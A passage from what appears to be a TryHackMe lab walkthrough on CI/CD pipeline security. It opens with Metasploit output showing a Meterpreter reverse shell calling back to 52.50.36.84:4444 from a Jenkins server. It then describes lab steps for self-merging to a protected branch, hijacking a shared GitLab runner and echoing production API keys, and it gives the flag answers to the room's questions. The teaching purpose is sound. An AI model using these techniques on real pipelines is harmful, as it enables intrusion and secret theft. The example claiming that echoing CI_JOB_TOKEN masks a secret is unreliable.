handler against </span><span class="token number" style="color:#36acaa">52.50</span><span class="token plain">.36.84:4444</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Sending stage </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3045348</span><span class="token plain"> bytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> to </span><span class="token number" style="color:#36acaa">52.50</span><span class="token plain">.36.84</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Meterpreter session </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> opened </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">10.10</span><span class="token plain">.198.237:40199 -</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">52.50</span><span class="token plain">.36.84:4444</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> at </span><span class="token number" style="color:#36acaa">2023</span><span class="token plain">-08-21 </span><span class="token number" style="color:#36acaa">20</span><span class="token plain">:49:51 +0100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> getuid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server username: jenkins</span><br></span></code></pre></div></div>
<p>You can also look to perform manual exploitation on the Jenkins server. This will involve accessing the script console and using a Groovy script to execute commands. Feel free to play around!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="protecting-the-build-server">Protecting the Build Server<a href="#protecting-the-build-server" class="hash-link" aria-label="Direct link to Protecting the Build Server" title="Direct link to Protecting the Build Server" translate="no">​</a></h3>
<p>The following steps can be followed to protect both your build server and build agents:</p>
<ul>
<li class=""><strong>Build Agent Configuration</strong>: Configure build agents to only communicate with the build server, avoiding external exposure.</li>
<li class=""><strong>Private Network</strong>: Place build agents within a private network, preventing direct internet access.</li>
<li class=""><strong>Firewalls</strong>: Employ firewalls to restrict incoming connections to necessary Build server-related traffic.</li>
<li class=""><strong>VPN</strong>: Use a VPN to access the build server and its agents securely from remote locations.</li>
<li class=""><strong>Token-Based Authentication</strong>: Utilise build agent tokens for authentication, adding an extra layer of security.</li>
<li class=""><strong>SSH Keys</strong>: For SSH-based build agents, use secure SSH keys for authentication.</li>
<li class=""><strong>Continuous Monitoring</strong>: Regularly monitor build agent activities and logs for unusual behaviour.</li>
<li class=""><strong>Regular Updates</strong>: Update both the build server and agents with security patches.</li>
<li class=""><strong>Security Audits</strong>: Conduct periodic security audits to identify and address vulnerabilities.</li>
<li class=""><strong>Remove Defaults and Harden Configuration</strong>: Make sure to harden your build server and remove all default credentials and weak configurations.</li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What can be used to ensure that remote access to the build server can be performed securely? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">VPN</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What can be used to add an additional layer of authentication security for build agents? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Token-Based Authentication</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Authenticate to Mother and follow the process to claim Flag 2. What is Flag 2? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{1769f776-e03c-40b6-b2eb-b298297c15cc}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-8-securing-the-build-pipeline">Task 8 Securing the Build Pipeline<a href="#task-8-securing-the-build-pipeline" class="hash-link" aria-label="Direct link to Task 8 Securing the Build Pipeline" title="Direct link to Task 8 Securing the Build Pipeline" translate="no">​</a></h2>
<p>With our build server secure, we will take a look at the pipeline itself next! Even if we do everything correctly, we still have to consider that one of our developers may be compromised. Whether the actual developer is compromised through a social engineering attack or simply their credentials being exposed, this compromise could be the downfall of our pipeline and build. Fortunately, there are protections that can be applied!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="access-gates">Access Gates<a href="#access-gates" class="hash-link" aria-label="Direct link to Access Gates" title="Direct link to Access Gates" translate="no">​</a></h3>
<p>Access gates, also known as gates or checkpoints, serve as &quot;stages&quot; within a software development pipeline. They ensure that code progresses through the pipeline only after meeting predefined quality and security criteria. Access gates are crucial in enhancing the development process&#x27;s control, quality assurance, and security. It&#x27;s beneficial for everyone.</p>
<ol>
<li class=""><strong>Enhanced Control</strong>: Access gates provide checkpoints in the pipeline, allowing controlled progression to different stages.</li>
<li class=""><strong>Quality Control</strong>: Gates ensures that code meets predefined quality standards before advancing.</li>
<li class=""><strong>Security Checks</strong>: Gates enables security assessments, such as vulnerability scans, before deployment.</li>
</ol>
<p><strong>Implementation Steps</strong>:</p>
<ol>
<li class=""><strong>Manual Approvals</strong>: Require manual approval before moving to the next stage, ensuring thorough reviews.</li>
<li class=""><strong>Automated Tests</strong>: Set up automated testing gates for code quality, unit tests, integration tests, etc.</li>
<li class=""><strong>Security Scans</strong>: Integrate security scanning tools to detect vulnerabilities in the codebase.</li>
<li class=""><strong>Release Gates</strong>: Use gates to verify proper documentation, versioning, and compliance.</li>
<li class=""><strong>Environment Validation</strong>: Validate the target environment&#x27;s readiness before deployment.</li>
<li class=""><strong>Rollback Plan</strong>: Include a gate for a well-defined rollback plan in case of issues post-deployment.</li>
<li class=""><strong>Monitoring</strong>: Implement monitoring gates to assess post-deployment performance.</li>
<li class=""><strong>Parallel Gates</strong>: Run gates in parallel to expedite the pipeline without compromising quality.</li>
<li class=""><strong>Auditing</strong>: Regularly review gate configurations and results to ensure effectiveness.</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-two-person-concept">The Two-Person Concept<a href="#the-two-person-concept" class="hash-link" aria-label="Direct link to The Two-Person Concept" title="Direct link to The Two-Person Concept" translate="no">​</a></h3>
<p>Even if we have access gates, we need to ensure that no single user can pass these access gates. If you are the developer who initiated the build, you should be prevented from passing the next access gate. This should always be someone else. By enforcing this with a technical control, it can be assured that in the event that a developer is compromised, a build cannot be pushed through. This is referred to as the two-person rule.</p>
<p>Some build servers may not allow you to ensure a control on the access gate to ensure that it is a different person. A good workaround in these cases is to simply increase the count of approvals needed from 1 to 2. This way, the developer provides one approval, but a secondary person has to provide the other.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploiting-misconfigured-access-gates">Exploiting Misconfigured Access Gates<a href="#exploiting-misconfigured-access-gates" class="hash-link" aria-label="Direct link to Exploiting Misconfigured Access Gates" title="Direct link to Exploiting Misconfigured Access Gates" translate="no">​</a></h3>
<p>Let&#x27;s take a look at an example where access gates have been misconfigured. In this example, we will provide you with access as the Ana user. You will use this user for all exercises going forward. You can use the following details to authenticate to Gitlab as Ana:</p>
<table><thead><tr><th style="text-align:center">Key</th><th style="text-align:center">Value</th></tr></thead><tbody><tr><td style="text-align:center">Username</td><td style="text-align:center">anatacker</td></tr><tr><td style="text-align:center">Password</td><td style="text-align:center">Password1@</td></tr></tbody></table>
<p>Ash has provided Ana with developer access to his Approval-Test repo, which can be found here: <a href="http://gitlab.tryhackme.loc/ash/approval-test" target="_blank" rel="noopener noreferrer" class="">http://gitlab.tryhackme.loc/ash/approval-test</a>. To protect the main branch of the repo, Ash has configured the main branch to be a protected branch, where developers are only allowed to make merge requests and no direct code changes. Let&#x27;s test this by updating the README file and trying to commit the change to the main branch. Navigate to the README file and click Edit:</p>
<p><img decoding="async" loading="lazy" alt="README file edit screen" src="/TryHackMe-CN/en/assets/images/image_20251130-143011-9dee18e1d14ce1fc2f3744d652a03cbd.png" width="1288" height="793" class="img_ev3q"></p>
<p>As you can see, Gitlab is automatically requesting that we start a merge request with the changes we want to make. You will also see that we cannot unselect the option to commit directly. Make a small change to the file and click Commit changes:</p>
<p><img decoding="async" loading="lazy" alt="commit changes button" src="/TryHackMe-CN/en/assets/images/image_20251131-143101-ffb541c770d5686499acec15bd4ecf9c.png" width="1016" height="1129" class="img_ev3q"></p>
<p>Immediately, you will see that we have to make a merge request for our change. Add a description and create the merge request. Ash&#x27;s thought process behind this was that it would protect the main branch, as the company has a policy that states merge requests must be approved by a manager. Since we are now forced to make a merge request, the main branch is protected. However, Ash has made the following two errors in his security thought process:</p>
<ul>
<li class="">Policies that are not enforced through a technology will not be respected by attackers. Sure, the policy says that a manager must approve the merge request, but if you read the merge request, you will see that from a technical standpoint, Gitlab indicates that approval is optional.</li>
<li class="">Although the main branch is protected by not allowing any direct pushes, since developers can still make merge requests, they can simply push their own merge request to commit code to the main branch. The two-person principle was not implemented to ensure that another person has to accept the merge request.</li>
</ul>
<p>Leveraging these mistakes, as an attacker, you can simply approve your own merge request (though it isn&#x27;t even needed) and you can then merge it to the main branch, as shown below!</p>
<p><img decoding="async" loading="lazy" alt="merged changes to main branch" src="/TryHackMe-CN/en/assets/images/image_20251131-143130-a2416e00b264b54613c5ee23cfa06670.png" width="734" height="625" class="img_ev3q"></p>
<p>Reviewing the code in the main branch, you have made a change to the main branch! Now comes the fun part. The GitLab runner was configured to only run on the main branch. Since we can now push code to the main branch, we can compromise the runner. Now that you know how to get your code to the main branch, make some changes to the .gitlab-ci.yml file to get code execution on the runner. You can use any of the techniques you have been taught up to this point!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="protecting-the-pipeline">Protecting the Pipeline<a href="#protecting-the-pipeline" class="hash-link" aria-label="Direct link to Protecting the Pipeline" title="Direct link to Protecting the Pipeline" translate="no">​</a></h3>
<p>Protecting your GitLab CI/CD pipeline is essential to ensure the security of your code and infrastructure. Here are steps you can take to protect your pipeline with access gates and prevent unauthorised code execution like the example above:</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="limit-branch-access">Limit Branch Access<a href="#limit-branch-access" class="hash-link" aria-label="Direct link to Limit Branch Access" title="Direct link to Limit Branch Access" translate="no">​</a></h4>
<p>Restrict who can push to the main branch. Only trusted developers should have the ability to push code to this branch. You can do this by configuring branch protection rules in your GitLab repository settings. Navigate to Settings &gt; Repository &gt; Default branch. Configure the rules to require reviews before allowing changes.</p>
<p><img decoding="async" loading="lazy" alt="settings page" src="/TryHackMe-CN/en/assets/images/image_20251132-143206-18ca74502bae039319088a59cee4643a.png" width="512" height="766" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="settings menu" src="/TryHackMe-CN/en/assets/images/image_20251132-143217-e0d5092ce612ab29b7f4e01fbfa8dbd1.png" width="2154" height="1110" class="img_ev3q"></p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="review-merge-requests">Review Merge Requests<a href="#review-merge-requests" class="hash-link" aria-label="Direct link to Review Merge Requests" title="Direct link to Review Merge Requests" translate="no">​</a></h4>
<p>Enforce merge requests (or pull requests) to make main branch changes. Merge requests provide a way to review and approve code changes before merging. You can configure a merge request approvals to ensure multiple team members review and approve changes.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="use-cicd-variables">Use CI/CD Variables<a href="#use-cicd-variables" class="hash-link" aria-label="Direct link to Use CI/CD Variables" title="Direct link to Use CI/CD Variables" translate="no">​</a></h4>
<p>Avoid storing sensitive information directly in your .gitlab-ci.yml file. Instead, use GitLab CI/CD variables to store secrets like API keys, passwords, and tokens. These variables can be protected and restricted to specific branches and tags.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="limit-runner-access">Limit Runner Access<a href="#limit-runner-access" class="hash-link" aria-label="Direct link to Limit Runner Access" title="Direct link to Limit Runner Access" translate="no">​</a></h4>
<p>Only allow trusted runners to execute CI/CD jobs. By specifying tags, you can register runners with specific tags and then restrict which runners can be used for jobs in your .gitlab-ci.yml file. Only runners with the appropriate tags can run jobs on the main branch.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="access-control-and-permissions">Access Control and Permissions<a href="#access-control-and-permissions" class="hash-link" aria-label="Direct link to Access Control and Permissions" title="Direct link to Access Control and Permissions" translate="no">​</a></h4>
<p>Review and configure project-level and group-level access controls and permissions. It&#x27;s always good to review and ensure you have the least privilege by checking the project&#x27;s settings and modifying the CI/CD configuration if necessary.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="regular-audits">Regular Audits<a href="#regular-audits" class="hash-link" aria-label="Direct link to Regular Audits" title="Direct link to Regular Audits" translate="no">​</a></h4>
<p>Conduct regular security audits of your GitLab configuration and CI/CD pipeline. Review who has access and permissions and ensure that best practices are followed.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="monitor-and-alert">Monitor and Alert<a href="#monitor-and-alert" class="hash-link" aria-label="Direct link to Monitor and Alert" title="Direct link to Monitor and Alert" translate="no">​</a></h4>
<p>Set up monitoring and alerting for your pipeline. Implement security monitoring solutions to detect unusual or unauthorised activities in your GitLab environment and CI/CD pipeline.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What can we add so that merges are raised for review instead of pushing the changes to code directly? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">merge requests</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What should we do so that only trusted runners execute CI/CD jobs? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">limit runner access</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Authenticate to Mother and follow the process to claim Flag 3. What is Flag 3? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{2411b26f-b213-462e-b94c-39d974e503e6}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-9-securing-the-build-environment">Task 9 Securing the Build Environment<a href="#task-9-securing-the-build-environment" class="hash-link" aria-label="Direct link to Task 9 Securing the Build Environment" title="Direct link to Task 9 Securing the Build Environment" translate="no">​</a></h2>
<p>Our pipeline is secure; we are almost there! Two more steps to go! Next on the list is making sure that our environments are secure. The last point where a threat actor may attempt to compromise our build is at the point where we deploy the build to its environment.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="environment-segregation">Environment Segregation<a href="#environment-segregation" class="hash-link" aria-label="Direct link to Environment Segregation" title="Direct link to Environment Segregation" translate="no">​</a></h3>
<p>A key security principle in our pipeline is to ensure that our different environments are segregated. Environments are not created equal, especially in these modern times where Agile principles are used. Developers are often provided with quite a lot of access and abilities in environments other than production (PROD) and  pre-production (PREPROD). If you need a refresher on the different types of environments, take a look at this room. With these additional permissions, we need to make sure that there is adequate segregation between the various environments.</p>
<p>At first glance, you may think that this is a simple endeavour. All we need to do is to ensure that developers do not have access to these sensitive environments. However, with the introduction of pipelines, this becomes a tad bit more complex. Even if we restrict direct access to these environments, there may be side channels in the pipeline that can be exploited. In this task, we will take a look at one common misconfiguration when the build agents themselves are not segregated.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="one-build-agent-to-rule-them-all">One Build Agent to Rule Them All<a href="#one-build-agent-to-rule-them-all" class="hash-link" aria-label="Direct link to One Build Agent to Rule Them All" title="Direct link to One Build Agent to Rule Them All" translate="no">​</a></h3>
<p>In our next example, Ash has learnt from his mistakes and made sure only to provide Ana with access to the development (DEV) branch. Main is now fully restricted. We still have access to the DEV branch since Ash wants his developers to adopt an Agile development process. Luckily for us, the DEV branch does have a Gitlab runner attached to it. Navigate to the new repo at <a href="http://gitlab.tryhackme.loc/ash/environments/" target="_blank" rel="noopener noreferrer" class="">http://gitlab.tryhackme.loc/ash/environments/</a> to get started. Navigate to the Operate-&gt;Environment section to view the two environments:</p>
<p><img decoding="async" loading="lazy" alt="environment selection menu" src="/TryHackMe-CN/en/assets/images/image_20251146-144614-1ed065ada21902dbe7620ffd9c816e78.png" width="1888" height="920" class="img_ev3q"></p>
<p>Let&#x27;s take a closer look at the last build that was performed for production. Click on the build and select the Pipeline tab to see the build that was executed for production:</p>
<p><img decoding="async" loading="lazy" alt="pipeline execution tab" src="/TryHackMe-CN/en/assets/images/image_20251146-144641-f7f729d97008a99174174f6bb1e57cb8.png" width="1019" height="528" class="img_ev3q"></p>
<p>Investigate the pipeline and look at one of the jobs executed for the main pipeline. By clicking on a job that has the main tag, pay attention to the runner specified in the top right corner:</p>
<p><img decoding="async" loading="lazy" alt="runner information" src="/TryHackMe-CN/en/assets/images/image_20251146-144657-d3312134ca2ad8bf1f4dd555c51e3ef0.png" width="287" height="214" class="img_ev3q"></p>
<p>As we can see, runner number 6 was used for the build. Following the steps from the previous task, in the DEV branch, make a small change to the README file and observe which runner is being used for the job.</p>
<p>Interesting! It seems that Ash is trying to save some budget by having a single runner for the project. Responsible for DEV and PROD builds. Therefore, if we compromise the runner through our DEV access, we can intercept a production build! Leverage one of the previous techniques to compromise the build agent and read some sensitive information from the runner! Once you have compromised the runner, you can access both DEV and PROD!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="protecting-the-build-environment">Protecting the Build Environment<a href="#protecting-the-build-environment" class="hash-link" aria-label="Direct link to Protecting the Build Environment" title="Direct link to Protecting the Build Environment" translate="no">​</a></h3>
<p>Protecting your build environment is crucial to prevent compromising your production pipeline through a single runner shared between DEV and PROD. Here are some steps you can take to enhance security:</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="isolate-environments">Isolate Environments<a href="#isolate-environments" class="hash-link" aria-label="Direct link to Isolate Environments" title="Direct link to Isolate Environments" translate="no">​</a></h4>
<p>Separate your DEV and PROD pipelines as much as possible. Use separate runners or runner tags for DEV and PROD builds. Ensuring that any compromise in the DEV environment does not directly impact PROD. This way, you can&#x27;t compromise PROD in the way shown in this task.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="restricted-access-for-cicd-jobs">Restricted Access for CI/CD Jobs<a href="#restricted-access-for-cicd-jobs" class="hash-link" aria-label="Direct link to Restricted Access for CI/CD Jobs" title="Direct link to Restricted Access for CI/CD Jobs" translate="no">​</a></h4>
<p>Limit access to the runner host. Only authorised personnel should have access to the machine(s) running the GitLab Runner. Implement strong access controls and monitor for unauthorised access. GitLab provides a &quot;Protected CI/CD environments&quot; feature that allows you to define access controls for environments, restricting who can deploy to them. Permission features limit and assigns who can modify CI/CD configuration, including the .gitlab-ci.yml file.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="monitoring-and-alerting">Monitoring and Alerting<a href="#monitoring-and-alerting" class="hash-link" aria-label="Direct link to Monitoring and Alerting" title="Direct link to Monitoring and Alerting" translate="no">​</a></h4>
<p>Implement monitoring and alerting for your CI/CD pipeline and runner. Set up alerts for suspicious activity or failed builds, which could indicate a compromise. Review and audit access permissions periodically, especially for environments and CI/CD configurations. Revoke access for users or roles that no longer require it.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> What should you do so that a compromised environment doesn&#x27;t affect other environments? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">isolate environments</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Authenticate to Mother and follow the process to claim Flag 4 from the DEV environment. What is Flag 4? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{28f36e4a-7c35-4e4d-bede-be698ddf0883}</span><br></span></code></pre></div></div></div></div></details><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Authenticate to Mother and follow the process to claim Flag 5 from the PROD environment. What is Flag 5? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{e9f99dbe-6bae-4849-adf7-18a449c93fe6}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-10-securing-the-build-secrets">Task 10 Securing the Build Secrets<a href="#task-10-securing-the-build-secrets" class="hash-link" aria-label="Direct link to Task 10 Securing the Build Secrets" title="Direct link to Task 10 Securing the Build Secrets" translate="no">​</a></h2>
<p>We can see the finish line in front of us! Our pipeline and build are almost secure! One final step remains: making sure that our build secrets are adequately protected!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="one-secret-to-rule-them-all">One Secret to Rule Them All<a href="#one-secret-to-rule-them-all" class="hash-link" aria-label="Direct link to One Secret to Rule Them All" title="Direct link to One Secret to Rule Them All" translate="no">​</a></h3>
<p>Larry has now finally learnt his lesson and made sure to implement segregated runners for the different environments. But there is one more issue. While these pipelines may be segregated, we need to make sure that the secrets (or variables as they are known in Gitlab) are also segregated. If the scope for secrets is not narrowly defined, we can request the use of PROD secrets in our DEV build, allowing us to compromise the production environment one last time! Navigate to the last repo we used for this exploit: <a href="http://gitlab.tryhackme.loc/ash/environments" target="_blank" rel="noopener noreferrer" class="">http://gitlab.tryhackme.loc/ash/environments</a>.</p>
<p>Let&#x27;s take a look at the environments and the latest builds for them, as we have done in the previous task. Taking a look at one of the production deployments, we can see that the build is making use of an API_KEY variable:</p>
<p><img decoding="async" loading="lazy" alt="API_KEY variable" src="/TryHackMe-CN/en/assets/images/image_20251149-144903-35000bfb6988972bd0306024b4fee89f.png" width="716" height="534" class="img_ev3q"></p>
<p>As Ana, we don&#x27;t have the permissions required to list the different variables, but taking a look at the DEV branch&#x27;s CI file, we can see that our DEV variable is different:</p>
<p><img decoding="async" loading="lazy" alt="DEV variable" src="/TryHackMe-CN/en/assets/images/image_20251149-144920-dd5815d961530ac7b4724b48c311b558.png" width="1006" height="428" class="img_ev3q"></p>
<p>In our case, the value is API_KEY_DEV. Let&#x27;s make a change to this variable and also echo out the value to see if we can access the PROD variable. Make the change to the CI file in the DEV branch and see what happens!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="protecting-the-build-secrets">Protecting the Build Secrets<a href="#protecting-the-build-secrets" class="hash-link" aria-label="Direct link to Protecting the Build Secrets" title="Direct link to Protecting the Build Secrets" translate="no">​</a></h3>
<p>Protecting build secrets, even when using GitLab CI/CD variables, is crucial for maintaining the security of your pipelines. GitLab CI/CD provides a feature called &quot;masked variables&quot; to help prevent secrets from being exposed in logs. Here&#x27;s how you can use this feature:</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="masking-variables">Masking Variables<a href="#masking-variables" class="hash-link" aria-label="Direct link to Masking Variables" title="Direct link to Masking Variables" translate="no">​</a></h4>
<p>You can mask variables in your .gitlab-ci.yml file by using the CI_JOB_TOKEN predefined variable. This token is automatically set by GitLab and can be used to mask any variable value you want to keep hidden.</p>
<p>For example, if you have a variable named MY_SECRET_KEY, you can use it like this:</p>
<div class="language-yml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">my_job</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">script</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> echo &quot;$MY_SECRET_KEY&quot; </span><span class="token comment" style="color:#999988;font-style:italic"># This will expose the secret</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">echo &quot;masked</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> $CI_JOB_TOKEN&quot; </span><span class="token comment" style="color:#999988;font-style:italic"># This will mask the secret</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="use-secure-variables">Use Secure Variables<a href="#use-secure-variables" class="hash-link" aria-label="Direct link to Use Secure Variables" title="Direct link to Use Secure Variables" translate="no">​</a></h4>
<p>If you want to store secrets securely in GitLab, you can use GitLab CI/CD variables with the &quot;Masked&quot; option enabled. These variables are stored securely and are never exposed in job logs, even if you use them directly in your scripts. To create a secure variable:</p>
<ul>
<li class="">Go to the GitLab project.</li>
<li class="">Navigate to Settings &gt; CI/CD &gt; Variables.</li>
<li class="">Add a new variable, select the &quot;Masked&quot; checkbox, and provide the value.</li>
